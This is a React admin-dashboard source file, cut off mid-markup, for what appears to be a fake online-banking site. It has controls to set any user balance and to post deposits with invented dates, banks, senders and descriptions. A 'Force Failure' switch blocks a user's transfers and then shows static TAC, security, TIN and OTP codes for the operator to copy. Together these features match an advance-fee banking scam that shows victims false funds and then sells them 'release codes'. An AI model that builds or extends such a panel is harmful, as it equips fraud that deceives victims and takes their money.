import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { useAuth } from "@/contexts/AuthContext";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { Loader2, Copy } from "lucide-react";

interface UserProfile {
  user_id: string;
  first_name: string;
  last_name: string;
  email: string;
  account_number: string;
  balance: number;
  is_online: boolean;
}

interface SupportConversation {
  id: string;
  user_id: string;
  status: string;
  created_at: string;
  updated_at: string;
  user_profile?: {
    first_name: string;
    last_name: string;
    email: string;
  };
}

interface SupportMessage {
  id: string;
  conversation_id: string;
  sender_id: string;
  message: string;
  sender_type: string;
  created_at: string;
}

const AdminDashboard = () => {
  const { user, loading } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();
  
  const [users, setUsers] = useState<UserProfile[]>([]);
  const [selectedUser, setSelectedUser] = useState<UserProfile | null>(null);
  const [newBalance, setNewBalance] = useState("");
  const [depositAmount, setDepositAmount] = useState("");
  const [balanceOperation, setBalanceOperation] = useState<"set" | "deposit">("deposit");
  const [conversations, setConversations] = useState<SupportConversation[]>([]);
  const [selectedConversation, setSelectedConversation] = useState<string | null>(null);
  const [conversationMessages, setConversationMessages] = useState<SupportMessage[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState("users");
  
  // New states for enhanced deposit functionality
  const [customDate, setCustomDate] = useState("");
  const [customBank, setCustomBank] = useState("Admin Bank");
  const [customSender, setCustomSender] = useState("Admin Deposit");
  const [customDescription, setCustomDescription] = useState("Admin deposit");
  
  // Transfer settings state
  const [transferSettings, setTransferSettings] = useState<Record<string, boolean>>({});
  
  // Transaction editing state
  const [editingTransaction, setEditingTransaction] = useState<any>(null);
  const [editTransactionForm, setEditTransactionForm] = useState({
    description: '',
    bank_name: '',
    recipient: '',
    created_at: ''
  });
  const [userTransactions, setUserTransactions] = useState<any[]>([]);
  
  // New state variables for static codes and user management
  const [tacCode, setTacCode] = useState("");
  const [securityCode, setSecurityCode] = useState("");
  const [tinNumber, setTinNumber] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [pendingTransactions, setPendingTransactions] = useState<any[]>([]);
  const [isCreatingUser, setIsCreatingUser] = useState(false);
  const [newUserData, setNewUserData] = useState({
    email: "",
    password: "",
    firstName: "",
    lastName: ""
  });

  const checkAdminAccess = async () => {
    if (!user) {
      navigate('/auth');
      return;
    }

    try {
      const { data, error } = await supabase
        .from('admin_roles')
        .select('role')
        .eq('user_id', user.id)
        .single();

      if (error || !data) {
        toast({
          title: "Access Denied",
          description: "You don't have admin privileges",
          variant: "destructive",
        });
        navigate('/');
        return;
      }

      setIsLoading(false);
    } catch (error) {
      console.error('Error checking admin access:', error);
      navigate('/');
    }
  };

  useEffect(() => {
    if (!loading && user) {
      checkAdminAccess();
    }
  }, [user, loading]);

  useEffect(() => {
    if (!isLoading) {
      fetchUsers();
      fetchConversations();
      fetchTransferSettings();
      fetchPendingTransactions();
    }
  }, [isLoading]);

  const fetchUsers = async () => {
    try {
      const { data: profiles, error: profilesError } = await supabase
        .from('profiles')
        .select('user_id, first_name, last_name, email, account_number');

      if (profilesError) throw profilesError;

      const { data: balances, error: balancesError } = await supabase
        .from('user_balances')
        .select('user_id, balance');

      if (balancesError) throw balancesError;

      const { data: presence, error: presenceError } = await supabase
        .from('user_presence')
        .select('user_id, is_online');

      if (presenceError) console.error('Presence error:', presenceError);

      const usersWithBalances: UserProfile[] = profiles.map(profile => {
        const userBalance = balances.find(b => b.user_id === profile.user_id);
        const userPresence = presence?.find(p => p.user_id === profile.user_id);
        return {
          ...profile,
          balance: userBalance?.balance || 0,
          is_online: userPresence?.is_online || false,
        };
      });

      setUsers(usersWithBalances);
    } catch (error) {
      console.error('Error fetching users:', error);
      toast({
        title: "Error",
        description: "Failed to fetch users",
        variant: "destructive",
      });
    }
  };

  const fetchTransferSettings = async () => {
    try {
      const { data, error } = await supabase
        .from('admin_transfer_settings')
        .select('user_id, force_success');

      if (error) throw error;

      const settings = data.reduce((acc, setting) => {
        acc[setting.user_id] = setting.force_success;
        return acc;
      }, {} as Record<string, boolean>);

      setTransferSettings(settings);
    } catch (error) {
      console.error('Error fetching transfer settings:', error);
    }
  };

  const fetchPendingTransactions = async () => {
    try {
      // First, get pending transactions
      const { data: pendingTxns, error: txnError } = await supabase
        .from('pending_transactions')
        .select('*')
        .order('created_at', { ascending: false });

      if (txnError) throw txnError;

      if (!pendingTxns || pendingTxns.length === 0) {
        setPendingTransactions([]);
        return;
      }

      // Then get profile data for each user
      const userIds = pendingTxns.map(txn => txn.user_id);
      const { data: profiles, error: profileError } = await supabase
        .from('profiles')
        .select('user_id, first_name, last_name, email, account_number')
        .in('user_id', userIds);

      if (profileError) throw profileError;

      // Combine the data
      const transactionsWithProfiles = pendingTxns.map(txn => ({
        ...txn,
        profiles: profiles?.find(p => p.user_id === txn.user_id) || {
          first_name: 'Unknown',
          last_name: 'User',
          email: 'unknown@example.com',
          account_number: 'N/A'
        }
      }));

      setPendingTransactions(transactionsWithProfiles);
    } catch (error) {
      console.error('Error fetching pending transactions:', error);
      setPendingTransactions([]);
    }
  };

  const fetchConversations = async () => {
    try {
      const { data: conversations, error: convError } = await supabase
        .from('support_conversations')
        .select('id, user_id, status, created_at, updated_at')
        .order('updated_at', { ascending: false });

      if (convError) throw convError;

      if (!conversations || conversations.length === 0) {
        setConversations([]);
        return;
      }

      const userIds = conversations.map(conv => conv.user_id);
      const { data: profiles, error: profileError } = await supabase
        .from('profiles')
        .select('user_id, first_name, last_name, email')
        .in('user_id', userIds);

      if (profileError) {
        console.error('Error fetching profiles:', profileError);
      }

      const conversationsWithProfile = conversations.map(conv => {
        const profile = profiles?.find(p => p.user_id === conv.user_id);
        return {
          ...conv,
          user_profile: profile || {
            first_name: 'Unknown',
            last_name: 'User',
            email: 'unknown@example.com'
          }
        };
      });

      setConversations(conversationsWithProfile);
    } catch (error) {
      console.error('Error fetching conversations:', error);
      setConversations([]);
    }
  };

  const fetchConversationMessages = async (conversationId: string) => {
    try {
      const { data, error } = await supabase
        .from('support_messages')
        .select('*')
        .eq('conversation_id', conversationId)
        .order('created_at', { ascending: true });

      if (error) throw error;
      setConversationMessages((data || []) as SupportMessage[]);
    } catch (error) {
      console.error('Error fetching messages:', error);
      toast({
        title: "Error",
        description: "Failed to fetch messages",
        variant: "destructive",
      });
    }
  };

  const updateUserBalance = async () => {
    if (!selectedUser || !newBalance) {
      toast({
        title: "Error",
        description: "Please select a user and enter a balance.",
        variant: "destructive"
      });
      return;
    }

    // Validate balance amount (must be less than 10^10 with max 2 decimal places)
    const balanceValue = parseFloat(newBalance);
    if (balanceValue >= 10000000000 || balanceValue < 0) {
      toast({
        title: "Error",
        description: "Balance must be between 0 and 9,999,999,999.99",
        variant: "destructive"
      });
      return;
    }

    setIsLoading(true);

    try {
      // Use upsert with proper conflict resolution on user_id
      const { error } = await supabase
        .from('user_balances')
        .upsert({
          user_id: selectedUser.user_id,
          balance: Math.round(balanceValue * 100) / 100, // Ensure 2 decimal places
          updated_at: new Date().toISOString()
        }, {
          onConflict: 'user_id',
          ignoreDuplicates: false
        });

      if (error) throw error;

      toast({
        title: "Success",
        description: `Updated ${selectedUser.first_name}'s balance to $${newBalance}`,
      });

      setNewBalance("");
      fetchUsers();
    } catch (error) {
      console.error('Error updating balance:', error);
      toast({
        title: "Error",
        description: "Failed to update balance.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const depositToUserAccount = async () => {
    if (!selectedUser || !depositAmount || !selectedUser.account_number) {
      toast({
        title: "Error",
        description: "Please select a user and enter a deposit amount.",
        variant: "destructive"
      });
      return;
    }

    setIsLoading(true);

    try {
      const depositDate = customDate ? new Date(customDate).toISOString() : new Date().toISOString();
      
      const { data, error } = await supabase.rpc('admin_deposit', {
        target_account_number: selectedUser.account_number,
        deposit_amount: parseFloat(depositAmount),
        admin_user_id: user?.id,
        custom_date: depositDate,
        custom_bank: customBank,
        custom_sender: customSender,
        custom_description: customDescription
      });

      if (error) throw error;

      const result = data as any;
      if (result?.error) {
        throw new Error(result.error);
      }

      toast({
        title: "Success",
        description: `Deposited $${depositAmount} to ${selectedUser.first_name}'s account. New balance: $${result?.new_balance || 'Updated'}`,
      });

      setDepositAmount("");
      setCustomDate("");
      setCustomBank("Admin Bank");
      setCustomSender("Admin Deposit");
      setCustomDescription("Admin deposit");
      fetchUsers();
    } catch (error) {
      console.error('Error depositing to account:', error);
      toast({
        title: "Error",
        description: "Failed to deposit to account.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const toggleTransferSetting = async (userId: string) => {
    try {
      const currentSetting = transferSettings[userId] ?? true;
      const newSetting = !currentSetting;
      
      console.log(`Toggling transfer setting for user ${userId}: ${currentSetting} -> ${newSetting}`);

      // Use upsert for better reliability and wait for completion
      const { data, error } = await supabase
        .from('admin_transfer_settings')
        .upsert({
          user_id: userId,
          force_success: newSetting,
          updated_at: new Date().toISOString()
        }, {
          onConflict: 'user_id',
          ignoreDuplicates: false
        })
        .select();

      if (error) throw error;

      // Wait a moment to ensure database consistency
      await new Promise(resolve => setTimeout(resolve, 100));

      // Update local state only after successful database operation
      setTransferSettings(prev => ({
        ...prev,
        [userId]: newSetting
      }));
      
      console.log(`Successfully updated transfer setting for user ${userId} to ${newSetting}`, data);

      if (!newSetting) {
        // Fetch user's static codes from profile for failure mode
        const { data: profile, error: profileError } = await supabase
          .from('profiles')
          .select('tac_code, security_code, tin_number, otp_code')
          .eq('user_id', userId)
          .single();

        if (profileError) {
          console.error('Error fetching user profile:', profileError);
        } else {
          setTacCode(profile?.tac_code || "");
          setSecurityCode(profile?.security_code || "");
          setTinNumber(profile?.tin_number || "");
          setOtpCode(profile?.otp_code || "");
        }
      }

      toast({
        title: "Success",
        description: `Transfer setting updated for ${selectedUser?.first_name}`,
      });
    } catch (error) {
      console.error('Error updating transfer setting:', error);
      toast({
        title: "Error",
        description: "Failed to update transfer setting",
        variant: "destructive"
      });
    }
  };

  const deleteUser = async (userId: string) => {
    if (!window.confirm('Are you sure you want to delete this user? This action cannot be undone.')) {
      return;
    }

    setIsLoading(true);
    try {
      const { data, error } = await supabase.rpc('admin_delete_user', {
        target_user_id: userId,
        admin_user_id: user?.id
      });
      
      if (error) throw error;
      if (data && typeof data === 'object' && 'error' in data && data.error) {
        throw new Error(data.error as string);
      }

      toast({
        title: "Success",
        description: "User deleted successfully",
      });

      fetchUsers();
    } catch (error) {
      console.error('Error deleting user:', error);
      toast({
        title: "Error",
        description: "Failed to delete user",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const createNewUser = async () => {
    if (!newUserData.email || !newUserData.password || !newUserData.firstName || !newUserData.lastName) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        variant: "destructive"
      });
      return;
    }

    setIsCreatingUser(true);
    try {
      const { data, error } = await supabase.functions.invoke('admin-create-user', {
        body: {
          email: newUserData.email,
          password: newUserData.password,
          first_name: newUserData.firstName,
          last_name: newUserData.lastName,
        }
      });

      if (error) {
        console.error('Edge function error:', error);
        throw error;
      }
      
      // Check if the function returned an error response
      if (data && (data as any).error) {
        throw new Error((data as any).error);
      }
      
      // Ensure we have a successful response
      if (!data || !(data as any).success) {
        throw new Error('Unknown error occurred during user creation');
      }

      toast({
        title: "Success",
        description: "New user created successfully",
      });

      setNewUserData({ email: "", password: "", firstName: "", lastName: "" });
      fetchUsers();
    } catch (error) {
      console.error('Error creating user:', error);
      const errorMessage = error instanceof Error ? error.message : "Failed to create user";
      
      // Provide more user-friendly error messages for common cases
      let displayMessage = errorMessage;
      if (errorMessage.includes('email address has already been registered')) {
        displayMessage = "A user with this email already exists. Please use a different email address.";
      } else if (errorMessage.includes('password')) {
        displayMessage = "Password does not meet requirements. Please use a stronger password.";
      } else if (errorMessage.includes('Unauthorized')) {
        displayMessage = "You are not authenticated. Please log in again.";
      } else if (errorMessage.includes('Forbidden') || errorMessage.includes('Admins only')) {
        displayMessage = "You don't have admin privileges. Only administrators can create users.";
      } else if (errorMessage.includes('FunctionsHttpError') || errorMessage.includes('non-2xx')) {
        displayMessage = "Server error occurred. Please check your admin permissions and try again.";
      }
      
      toast({
        title: "Error",
        description: displayMessage,
        variant: "destructive"
      });
    } finally {
      setIsCreatingUser(false);
    }
  };

  const approveTransaction = async (pendingTransaction: any) => {
    setIsLoading(true);
    try {
      const { error: transactionError } = await supabase
        .from('transactions')
        .insert({
          user_id: pendingTransaction.user_id,
          type: 'transfer',
          amount: -pendingTransaction.amount,
          description: pendingTransaction.description,
          recipient: pendingTransaction.recipient,
          bank_name: pendingTransaction.bank_name,
          account_number: pendingTransaction.account_number,
          sort_code: pendingTransaction.sort_code,
          status: 'completed'
        });

      if (transactionError) throw transactionError;

      const { data: currentBalance, error: balanceError } = await supabase
        .from('user_balances')
        .select('balance')
        .eq('user_id', pendingTransaction.user_id)
        .single();

      if (balanceError) throw balanceError;

      const newBalance = parseFloat(currentBalance.balance.toString()) - pendingTransaction.amount;
      
      const { error: updateError } = await supabase
        .from('user_balances')
        .update({ balance: newBalance })
        .eq('user_id', pendingTransaction.user_id);

      if (updateError) throw updateError;

      const { error: deleteError } = await supabase
        .from('pending_transactions')
        .delete()
        .eq('id', pendingTransaction.id);

      if (deleteError) throw deleteError;

      toast({
        title: "Success",
        description: "Transaction approved and completed",
      });

      fetchPendingTransactions();
      fetchUsers();
    } catch (error) {
      console.error('Error approving transaction:', error);
      toast({
        title: "Error",
        description: "Failed to approve transaction",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const rejectTransaction = async (pendingTransactionId: string) => {
    setIsLoading(true);
    try {
      const { error } = await supabase
        .from('pending_transactions')
        .delete()
        .eq('id', pendingTransactionId);

      if (error) throw error;

      toast({
        title: "Success",
        description: "Transaction rejected",
      });

      fetchPendingTransactions();
    } catch (error) {
      console.error('Error rejecting transaction:', error);
      toast({
        title: "Error",
        description: "Failed to reject transaction",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const sendMessage = async () => {
    if (!selectedConversation || !newMessage.trim()) {
      toast({
        title: "Error",
        description: "Please select a conversation and enter a message.",
        variant: "destructive"
      });
      return;
    }

    try {
      const { error } = await supabase
        .from('support_messages')
        .insert({
          conversation_id: selectedConversation,
          sender_id: user?.id,
          sender_type: 'admin',
          message: newMessage.trim()
        });

      if (error) throw error;

      const { error: updateError } = await supabase
        .from('support_conversations')
        .update({ 
          status: 'open',
          updated_at: new Date().toISOString()
        })
        .eq('id', selectedConversation);

      if (updateError) throw updateError;

      setNewMessage("");
      fetchConversationMessages(selectedConversation);
      fetchConversations();

      toast({
        title: "Success",
        description: "Message sent successfully",
      });
    } catch (error) {
      console.error('Error sending message:', error);
      toast({
        title: "Error",
        description: "Failed to send message",
        variant: "destructive"
      });
    }
  };

  if (loading || isLoading) {
    return (
      <div className="min-h-screen bg-background bg-banking-gradient flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background bg-banking-gradient p-4 md:p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex items-center justify-between">
          <h1 className="text-3xl font-bold text-foreground">Admin Dashboard</h1>
          <Button variant="outline" onClick={() => navigate('/')}>
            Back to App
          </Button>
        </div>

        {/* Mobile Navigation */}
        <div className="md:hidden mb-4">
          <Select value={activeTab} onValueChange={setActiveTab}>
            <SelectTrigger>
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="users">Users</SelectItem>
              <SelectItem value="balance">Balance</SelectItem>
              <SelectItem value="transfer">Transfer</SelectItem>
              <SelectItem value="transactions">Transactions</SelectItem>
              <SelectItem value="support">Support</SelectItem>
            </SelectContent>
          </Select>
        </div>

        {/* Desktop Navigation */}
        <div className="hidden md:flex border-b border-border mb-6 overflow-x-auto">
          <button
            className={`px-4 lg:px-6 py-3 text-xs lg:text-sm font-medium transition-colors whitespace-nowrap ${
              activeTab === "users"
                ? "border-b-2 border-primary text-primary"
                : "text-muted-foreground hover:text-foreground"
            }`}
            onClick={() => setActiveTab("users")}
          >
            User Management
          </button>
          <button
            className={`px-4 lg:px-6 py-3 text-xs lg:text-sm font-medium transition-colors whitespace-nowrap ${
              activeTab === "balance"
                ? "border-b-2 border-primary text-primary"
                : "text-muted-foreground hover:text-foreground"
            }`}
            onClick={() => setActiveTab("balance")}
          >
            Balance Control
          </button>
          <button
            className={`px-4 lg:px-6 py-3 text-xs lg:text-sm font-medium transition-colors whitespace-nowrap ${
              activeTab === "transfer"
                ? "border-b-2 border-primary text-primary"
                : "text-muted-foreground hover:text-foreground"
            }`}
            onClick={() => setActiveTab("transfer")}
          >
            Transfer Control
          </button>
          <button
            className={`px-4 lg:px-6 py-3 text-xs lg:text-sm font-medium transition-colors whitespace-nowrap ${
              activeTab === "transactions"
                ? "border-b-2 border-primary text-primary"
                : "text-muted-foreground hover:text-foreground"
            }`}
            onClick={() => setActiveTab("transactions")}
          >
            Transaction Manager
          </button>
          <button
            className={`px-4 lg:px-6 py-3 text-xs lg:text-sm font-medium transition-colors whitespace-nowrap ${
              activeTab === "support"
                ? "border-b-2 border-primary text-primary"
                : "text-muted-foreground hover:text-foreground"
            }`}
            onClick={() => setActiveTab("support")}
          >
            Customer Support
          </button>
        </div>

        {/* Content */}
        <div className="space-y-6">
          {/* User Management Tab */}
          {activeTab === "users" && (
            <div className="space-y-6">
              <Card>
                <CardHeader>
                  <CardTitle>User Management</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid gap-4">
                    {users.map((user) => (
                      <Card key={user.user_id} className="p-4">
                        <div className="flex items-center justify-between">
                          <div className="flex-1">
                            <h3 className="font-semibold">{user.first_name} {user.last_name}</h3>
                            <p className="text-sm text-muted-foreground">{user.email}</p>
                            <p className="text-sm text-muted-foreground">Account: {user.account_number}</p>
                            <p className="text-sm">Balance: ${user.balance}</p>
                            <div className="flex items-center space-x-2 mt-1">
                              <div className={`w-2 h-2 rounded-full ${user.is_online ? 'bg-green-500' : 'bg-gray-500'}`} />
                              <span className="text-xs text-muted-foreground">
                                {user.is_online ? 'Online' : 'Offline'}
                              </span>
                            </div>
                          </div>
                          <Button
                            variant="destructive"
                            size="sm"
                            onClick={() => deleteUser(user.user_id)}
                            disabled={isLoading}
                          >
                            Delete
                          </Button>
                        </div>
                      </Card>
                    ))}
                  </div>
                </CardContent>
              </Card>

              <Card className="p-4">
                <h3 className="text-lg font-semibold mb-4">Create New User</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <Input
                    placeholder="Email"
                    value={newUserData.email}
                    onChange={(e) => setNewUserData({...newUserData, email: e.target.value})}
                  />
                  <Input
                    placeholder="Password"
                    type="password"
                    value={newUserData.password}
                    onChange={(e) => setNewUserData({...newUserData, password: e.target.value})}
                  />
                  <Input
                    placeholder="First Name"
                    value={newUserData.firstName}
                    onChange={(e) => setNewUserData({...newUserData, firstName: e.target.value})}
                  />
                  <Input
                    placeholder="Last Name"
                    value={newUserData.lastName}
                    onChange={(e) => setNewUserData({...newUserData, lastName: e.target.value})}
                  />
                </div>
                <Button
                  onClick={createNewUser}
                  disabled={isCreatingUser}
                  className="mt-4"
                >
                  {isCreatingUser ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Creating...
                    </>
                  ) : (
                    'Create User'
                  )}
                </Button>
              </Card>
            </div>
          )}

          {/* Balance Control Tab */}
          {activeTab === "balance" && (
            <div className="grid gap-6 md:grid-cols-2">
              <Card>
                <CardHeader>
                  <CardTitle>Balance Control</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <label className="text-sm font-medium mb-2 block">Select User</label>
                    <Select value={selectedUser?.user_id || ""} onValueChange={(value) => {
                      const user = users.find(u => u.user_id === value);
                      setSelectedUser(user || null);
                    }}>
                      <SelectTrigger>
                        <SelectValue placeholder="Choose a user" />
                      </SelectTrigger>
                      <SelectContent>
                        {users.map((user) => (
                          <SelectItem key={user.user_id} value={user.user_id}>
                            {user.first_name} {user.last_name} (${user.balance})
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <label className="text-sm font-medium mb-2 block">Operation</label>
                    <Select value={balanceOperation} onValueChange={(value: "set" | "deposit") => setBalanceOperation(value)}>
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="set">Set Balance</SelectItem>
                        <SelectItem value="deposit">Deposit</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  {balanceOperation === "set" && (
                    <div>
                      <label className="text-sm font-medium mb-2 block">New Balance</label>
                      <Input
                        type="number"
                        value={newBalance}
                        onChange={(e) => setNewBalance(e.target.value)}
                        placeholder="0.00"
                      />
                      <Button 
                        onClick={updateUserBalance} 
                        disabled={!selectedUser || !newBalance || isLoading}
                        className="w-full mt-2"
                      >
                        {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                        Update Balance
                      </Button>
                    </div>
                  )}

                  {balanceOperation === "deposit" && (
                    <div className="space-y-4">
                      <div>
                        <label className="text-sm font-medium mb-2 block">Deposit Amount</label>
                        <Input
                          type="number"
                          value={depositAmount}
                          onChange={(e) => setDepositAmount(e.target.value)}
                          placeholder="0.00"
                        />
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <label className="text-sm font-medium mb-2 block">Custom Date</label>
                          <Input
                            type="datetime-local"
                            value={customDate}
                            onChange={(e) => setCustomDate(e.target.value)}
                          />
                        </div>
                        <div>
                          <label className="text-sm font-medium mb-2 block">Bank Name</label>
                          <Input
                            value={customBank}
                            onChange={(e) => setCustomBank(e.target.value)}
                            placeholder="Bank Name"
                          />
                        </div>
                        <div>
                          <label className="text-sm font-medium mb-2 block">Sender Name</label>
                          <Input
                            value={customSender}
                            onChange={(e) => setCustomSender(e.target.value)}
                            placeholder="Sender Name"
                          />
                        </div>
                        <div>
                          <label className="text-sm font-medium mb-2 block">Description</label>
                          <Input
                            value={customDescription}
                            onChange={(e) => setCustomDescription(e.target.value)}
                            placeholder="Transaction description"
                          />
                        </div>
                      </div>

                      <Button 
                        onClick={depositToUserAccount} 
                        disabled={!selectedUser || !depositAmount || isLoading}
                        className="w-full"
                      >
                        {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                        Deposit to Account
                      </Button>
                    </div>
                  )}
                </CardContent>
              </Card>

              {selectedUser && (
                <Card>
                  <CardHeader>
                    <CardTitle>User Details</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-2">
                      <p><strong>Name:</strong> {selectedUser.first_name} {selectedUser.last_name}</p>
                      <p><strong>Email:</strong> {selectedUser.email}</p>
                      <p><strong>Account:</strong> {selectedUser.account_number}</p>
                      <p><strong>Current Balance:</strong> ${selectedUser.balance}</p>
                      <p><strong>Status:</strong> 
                        <Badge variant={selectedUser.is_online ? "default" : "secondary"} className="ml-2">
                          {selectedUser.is_online ? "Online" : "Offline"}
                        </Badge>
                      </p>
                    </div>
                  </CardContent>
                </Card>
              )}
            </div>
          )}

          {/* Transfer Control Tab */}
          {activeTab === "transfer" && (
            <Card>
              <CardHeader>
                <CardTitle>Transfer Control</CardTitle>
              </CardHeader>
              <CardContent className="space-y-6">
                <div>
                  <label className="text-sm font-medium mb-2 block">Select User</label>
                  <Select value={selectedUser?.user_id || ""} onValueChange={(value) => {
                    const user = users.find(u => u.user_id === value);
                    setSelectedUser(user || null);
                    if (user) {
                      const isFailureMode = !(transferSettings[value] ?? true);
                      if (isFailureMode) {
                        // Fetch user's static codes for failure mode
                        supabase
                          .from('profiles')
                          .select('tac_code, security_code, tin_number, otp_code')
                          .eq('user_id', value)
                          .single()
                          .then(({ data, error }) => {
                            if (!error && data) {
                              setTacCode(data.tac_code || "");
                              setSecurityCode(data.security_code || "");
                              setTinNumber(data.tin_number || "");
                              setOtpCode(data.otp_code || "");
                            }
                          });
                      }
                    }
                  }}>
                    <SelectTrigger>
                      <SelectValue placeholder="Choose a user to control their transfer settings" />
                    </SelectTrigger>
                    <SelectContent>
                      {users.map((user) => (
                        <SelectItem key={user.user_id} value={user.user_id}>
                          {user.first_name} {user.last_name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                {selectedUser && (
                  <div className="space-y-6">
                    <div className="flex items-center justify-between p-4 border rounded-lg">
                      <div>
                        <h3 className="font-medium">Transfer Mode for {selectedUser.first_name}</h3>
                        <p className="text-sm text-muted-foreground">
                          {transferSettings[selectedUser.user_id] ?? true ? "Success Mode" : "Failure Mode"}
                        </p>
                      </div>
                      <div className="flex space-x-2">
                        <Button
                          variant={transferSettings[selectedUser.user_id] ?? true ? "default" : "outline"}
                          onClick={() => toggleTransferSetting(selectedUser.user_id)}
                        >
                          Force Success
                        </Button>
                        <Button
                          variant={!(transferSettings[selectedUser.user_id] ?? true) ? "destructive" : "outline"}
                          onClick={() => toggleTransferSetting(selectedUser.user_id)}
                        >
                          Force Failure
                        </Button>
                      </div>
                    </div>

                    {!(transferSettings[selectedUser.user_id] ?? true) && (
                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-4">
                        <div className="space-y-2">
                          <label className="text-sm font-medium">TAC Code</label>
                          <div className="flex space-x-2">
                            <Input 
                              value={tacCode} 
                              readOnly 
                              className="font-mono text-center bg-secondary text-xs"
                            />
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => {
                                navigator.clipboard.writeText(tacCode);
                                toast({ title: "Copied", description: "TAC code copied to clipboard" });
                              }}
                            >
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>
                        
                        <div className="space-y-2">
                          <label className="text-sm font-medium">Security Code</label>
                          <div className="flex space-x-2">
                            <Input 
                              value={securityCode} 
                              readOnly 
                              className="font-mono text-center bg-secondary text-xs"
                            />
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => {
                                navigator.clipboard.writeText(securityCode);
                                toast({ title: "Copied", description: "Security code copied to clipboard" });
                              }}
                            >
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>
                        
                        <div className="space-y-2">
                          <label className="text-sm font-medium">TIN Number</label>
                          <div className="flex space-x-2">
                            <Input 
                              value={tinNumber} 
                              readOnly 
                              className="font-mono text-center bg-secondary text-xs"
                            />
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => {
                                navigator.clipboard.writeText(tinNumber);
                                toast({ title: "Copied", description: "TIN number copied to clipboard" });
                              }}
                            >
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>

                        <div className="space-y-2">
                          <label className="text-sm font-medium">OTP Code</label>
                          <div className="flex space-x-2">
                            <Input 
                              value={otpCode} 
                              readOnly 
                              className="font-mono text-center bg-secondary text-xs"
                            />
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => {
                                navigator.clipboard.writeText(otpCode);
                                toast({ title: "Copied", description: "OTP code copied to clipboard" });
                              }}
                            >
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </CardContent>

              {/* Pending Transactions */}
              <Card className="mt-6">
                <CardHeader>
                  <CardTitle>Pending Transactions (Awaiting Approval)</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {pendingTransactions.length === 0 ? (
                      <p className="text-muted-foreground">No pending transactions</p>
                    ) : (
                      pendingTransactions.map((transaction) => (
                        <Card key={transaction.id} className="p-4">
                          <div className="flex flex-col space-y-3">
                            <div className="flex justify-between items-start">
                              <div>
                                <h4 className="font-semibold">
                                  {transaction.profiles?.first_name} {transaction.profiles?.last_name}
                                </h4>
                                <p className="text-sm text-muted-foreground">{transaction.profiles?.email}</p>
                                <p className="text-sm text-muted-foreground">Account: {transaction.profiles?.account_number}</p>
                              </div>
                              <div className="text-right">
                                <p className="font-semibold text-red-600">-${transaction.amount}</p>
                                <p className="text-xs text-muted-foreground">
                                  {new Date(transaction.created_at).toLocaleDateString()}
                                </p>
                              </div>
                            </div>
                            
                            <div className="border-t pt-3">
                              <p className="text-sm"><strong>To:</strong> {transaction.recipient}</p>
                              <p className="text-sm"><strong>Bank:</strong> {transaction.bank_name}</p>
                              <p className="text-sm"><strong>Account:</strong> {transaction.account_number}</p>
                              <p className="text-sm"><strong>Description:</strong> {transaction.description}</p>
                            </div>
                            
                            <div className="flex space-x-2 pt-2">
                              <Button
                                onClick={() => approveTransaction(transaction)}
                                disabled={isLoading}
                                className="flex-1"
                              >
                                Approve
                              </Button>
                              <Button
                                variant="destructive"
                                onClick={() => rejectTransaction(transaction.id)}
                                disabled={isLoading}
                                className="flex-1"
                              >
                                Reject
                              </Button>
                            </div>
                          </div>
                        </Card>
                      ))
                    )}
                  </div>
                </CardContent>
              </Card>
            </Card>
          )}

          {/* Support Tab */}
          {activeTab === "support" && (
            <div className="grid gap-6 md:grid-cols-2">
              <Card>
                <CardHeader>
                  <CardTitle>Support Conversations</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    {conversations.length === 0 ? (
                      <p className="text-muted-foreground">No conversations found</p>
                    ) : (
                      conversations.map((conversation) => (
                        <div
